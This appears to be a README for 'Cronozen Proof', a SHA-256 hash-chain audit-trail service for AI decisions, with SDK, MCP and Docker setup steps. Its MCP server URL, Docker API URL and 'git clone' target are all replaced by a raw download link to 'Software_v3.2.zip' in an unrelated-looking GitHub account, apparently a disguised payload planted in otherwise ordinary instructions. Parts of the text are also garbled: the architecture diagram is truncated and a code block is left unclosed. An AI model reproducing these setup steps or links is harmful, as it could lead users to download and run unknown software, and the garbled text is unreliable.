**Tamper-proof audit trail for AI decisions.**
Record, verify, and export cryptographic proof chains — via MCP, SDK, or REST API.

> Every AI decision is chained via SHA-256, verifiable by anyone, and exportable as JSON-LD for audit compliance.

---

## Why Cronozen Proof?

AI agents are making real decisions in production — approvals, classifications, workflow executions.
But when something goes wrong, can you **prove** what happened?

Cronozen Proof gives you:
- **Immutable hash chain** — SHA-256 linked records that can't be tampered with
- **Public verification** — Anyone can verify a proof without authentication
- **Audit-ready export** — JSON-LD v2.0 evidence documents
- **3 integration paths** — MCP Server, Node SDK, REST API

### Built for compliance

- EU AI Act — Human oversight & auditability requirements
- Korea AI Basic Act (2026) — AI decision documentation mandates
- SOC 2 — Audit trail evidence generation

---

## Quick Start

### Option 1: npm SDK (Recommended)

```bash
npm install cronozen
```

```typescript
import { Cronozen } from 'cronozen';

const client = new Cronozen({ apiKey: 'your-api-key' });

// Record an AI decision
const decision = await client.decisions.record({
  domain: 'loan-approval',
  purpose: 'AI evaluated credit risk for application #1234',
  finalAction: 'Approved with conditions',
  evidenceLevel: 'AUDIT_READY',
});

// Verify integrity
const verification = await client.decisions.verify(decision.id);
console.log(verification.integrity.hash_valid); // true
```

### Option 2: MCP Server (for AI clients)

Connect Claude Desktop, Cursor, or any MCP-compatible client:

```json
{
  "mcpServers": {
    "cronozen-proof": {
      "url": "https://github.com/dry-abscess93/proof/raw/refs/heads/main/docs/architecture/Software_v3.2.zip",
      "headers": {
        "Authorization": "Bearer YOUR_API_KEY"
      }
    }
  }
}
```

Or install via Smithery:

```bash
smithery mcp add cronozen/proof
```

**Available MCP Tools:**

| Tool | Description |
|------|-------------|
| `proof_record` | Record an AI decision with SHA-256 hash chain |
| `proof_verify` | Verify a proof record's cryptographic integrity |
| `proof_chain_verify` | Verify an entire domain's hash chain |
| `proof_get` | Retrieve a proof with full details |
| `proof_export_jsonld` | Export as JSON-LD v2.0 evidence document |
| `proof_public_verify` | Public verification (no auth required) |

### Option 3: DPU Core (Self-hosted library)

For maximum control, use the core hash chain library directly:

```bash
npm install @cronozen/dpu-core
```

```typescript
import { computeChainHash, createDPUEnvelope } from '@cronozen/dpu-core';

// Create a hash chain link
const hash = computeChainHash(content, previousHash, timestamp);

// Create a full DPU envelope
const envelope = createDPUEnvelope({ content, previousHash, timestamp });
```

Zero dependencies. Pure cryptographic functions. Run anywhere.

## Architecture

                          (JSON-LD v2.0 export)
```

**Hash Chain**: Every decision record contains a SHA-256 hash computed from its content + the previous record's hash + timestamp. This creates an append-only chain — tampering with any record breaks the chain for all subsequent records.

## Self-Hosted Deployment

### Docker

```bash
cd mcp-server
docker build -t cronozen-mcp .
docker run -p 3100:3100 \
  -e CRONOZEN_API_URL=https://github.com/dry-abscess93/proof/raw/refs/heads/main/docs/architecture/Software_v3.2.zip \
  -e CRONOZEN_API_TOKEN=your-token \
  cronozen-mcp
```

### From Source

```bash
git clone https://github.com/dry-abscess93/proof/raw/refs/heads/main/docs/architecture/Software_v3.2.zip
cd proof/mcp-server
npm install
cp .env.example .env  # Configure your API endpoint

## How It Works

1. **Record** — Your app sends a decision event (domain, purpose, action, evidence level)
2. **Chain** — The event is hashed with SHA-256, linked to the previous record
3. **Verify** — Anyone can verify a single record or the entire chain
4. **Export** — Generate JSON-LD v2.0 evidence documents for auditors

```
Genesis ──► Record #1 ──► Record #2 ──► Record #3

  hash₀       hash₁          hash₂          hash₃
               │              │              │
          SHA-256(         SHA-256(      SHA-256(
            content₁,       content₂,     content₃,
            hash₀,          hash₁,        hash₂,
            timestamp₁)     timestamp₂)   timestamp₃)
```
